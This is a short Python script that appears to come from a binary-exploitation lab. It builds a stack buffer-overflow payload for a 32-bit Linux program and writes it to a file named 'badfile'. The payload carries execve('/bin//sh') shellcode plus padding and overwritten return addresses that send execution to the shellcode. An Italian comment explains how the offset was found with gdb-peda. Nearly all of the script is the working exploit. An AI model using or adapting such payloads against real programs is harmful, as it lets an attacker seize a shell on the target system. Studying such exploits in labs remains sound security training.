import struct

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
string_addr = struct.pack("I", 0x0804a060)
vuln = struct.pack("I", 0x804846b)

p = "A\n"

string_addr_int = int("0x0804a060",16)
shellcode_addr = string_addr_int + 11


p1 = "a"*11
p1 += shellcode
print(len(shellcode))
p1 += "b" * (148-(len(p1)))

p1 += string_addr
p1 += "c" * (160-(len(p1)))
p1 += vuln

#il 4 fai pattern create 20 lo aggiungi alla fine del badfile e poi lo fai partire da peda, gdb pattern search e trovi 4

p1 += "d" * 4 
p1 += struct.pack("I", shellcode_addr)
payload = p+p1

with open("badfile", "wb") as f:
	f.write(payload)

